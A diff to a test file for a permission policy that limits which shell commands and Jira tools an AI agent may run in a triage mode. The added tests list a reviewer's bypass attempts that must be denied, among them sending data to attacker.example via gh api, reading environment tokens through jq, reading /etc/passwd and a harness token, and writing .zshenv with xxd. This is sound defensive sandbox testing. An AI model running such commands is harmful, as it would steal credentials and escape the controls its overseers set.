@@ -61,6 +61,68 @@ test("triage Bash can't read outside its empty folder", () => {
   expect(isTriageCommand("rm -rf x")).toBe(false);
 });
 
+test("triage Bash is gh plus a few filters that take no path: the reviewer's bypasses all fail", () => {
+  for (const c of [
+    // combined short flags carry a method, a field or a header
+    "gh api -iXPOST repos/o/r/issues/1/comments",
+    "gh api -iFbody=x repos/o/r/issues/1/comments",
+    "gh api repos/o/r/issues -if",
+    "gh api repos/o/r -iH 'X: y'",
+    "gh api repos/o/r/issues/1 -w",
+    // any other flag of gh api, or a second endpoint
+    "gh api repos/o/r --preview x",
+    "gh api repos/o/r/issues repos/o/r/pulls",
+    "gh pr view 1 --template '{{.title}}'",
+    // another host
+    "gh api https://attacker.example/?d=x",
+    "gh api //attacker.example/x",
+    "gh pr view https://ghe.example.com/o/r/pull/1",
+    // the environment, through gh's jq or jq itself
+    "gh api user --jq env",
+    "gh api user --jq=.x+env.TOKEN",
+    "gh pr view 1 --json title -q '$ENV.PATH'",
+    "jq -n env",
+    "jq -n '$ENV'",
+    "jq -n 'input'",
+    "jq -f prog.jq",
+    "jq --rawfile x /etc/passwd .",
+    "jq . x.json",
+    // reads outside the folder the parser doesn't see
+    "cat < ~/.harness/token",
+    "cat </etc/passwd",
+    "head -1 {..,x}/y",
+    "grep a {/etc/passwd,x}",
+    "grep -f/etc/passwd x",
+    "grep -rl key",
+    "cat *",
+    // writes: cd to $HOME then a write, xxd/tree outputs
+    "cd; echo 2f | xxd -r -p - .zshenv",
+    "cd",
+    "xxd -r -p - out",
+    "tree -o out",
+    "sort -o out",
+    // not in the small set
+    "ls",
+    "cat x",
+    "tree",
+    "find .",
+    "git log",
+  ]) expect([c, isTriageCommand(c)]).toEqual([c, false]);
+  for (const c of [
+    "gh api repos/o/r/pulls/1/comments --paginate --jq '.[] | {user: .user.login, body}'",
+    "gh api /repos/o/r/issues/1 -i",
+    "gh pr view 1 --json title,body --jq '.title' | head -3",
+    "gh pr view https://github.com/o/r/pull/1",
+    "gh search issues 'copilot in:comments' | wc -l",
+    "gh pr view 1 | jq -r '{a: .title}' | grep -v x | sort | uniq | cut -c1-20",
+  ]) expect([c, isTriageCommand(c)]).toEqual([c, true]);
+});
+
+test("xxd and tree can't write a file in the general read-only policy either", () => {
+  for (const c of ["xxd -r -p - out", "xxd -r in out", "tree -o out", "tree --output=out"]) expect(isReadOnlyCommand(c)).toBe(false);
+  for (const c of ["xxd file", "tree src"]) expect(isReadOnlyCommand(c)).toBe(true);
+});
+
 test("triage answers Bash by the read-only policy, MCP tools by their names, and everything else no", () => {
   expect(bash("gh pr view 1")).toBe("allow");
   expect(bash("gh pr merge 1")).toBe("deny");
@@ -68,10 +130,11 @@ test("triage answers Bash by the read-only policy, MCP tools by their names, and
   expect(triageDecision("Bash", {}).behavior).toBe("deny");
   expect(triageDecision("Bash", { command: 5 }).behavior).toBe("deny");
 
-  for (const t of ["get-issue", "list-comments", "search-issues", "find-users", "getJiraIssue", "listProjects", "read_page", "query-database", "get_issue", "search"]) {
+  for (const t of ["get-issue", "list-comments", "search-issues", "find-users", "getJiraIssue", "listProjects", "read_page", "get_issue", "search"]) {
     expect(triageDecision(`mcp__claude_ai_hc-jira__${t}`, {}).behavior).toBe("allow");
   }
-  for (const t of ["add-comment", "create-issue", "transition-issue", "update-issue", "delete-comment", "manage-watchers", "getaway", "budget-list", "send_message"]) {
+  for (const t of ["getTransitionsForJiraIssue", "getJiraIssueTypeMetaWithFields", "list_organizations"]) expect(triageDecision(`mcp__jira__${t}`, {}).behavior).toBe("allow");
+  for (const t of ["add-comment", "create-issue", "transition-issue", "update-issue", "delete-comment", "manage-watchers", "getaway", "budget-list", "send_message", "query", "query-run", "get_or_create_user", "find-and-replace", "search_and_run", "getOrCreateIssue", "listAndDelete"]) {
     expect(triageDecision(`mcp__claude_ai_hc-jira__${t}`, {}).behavior).toBe("deny");
   }
   for (const t of ["Edit", "Write", "Read", "WebFetch", "Agent", "Task", "NotebookEdit"]) expect(triageDecision(t, {}).behavior).toBe("deny");
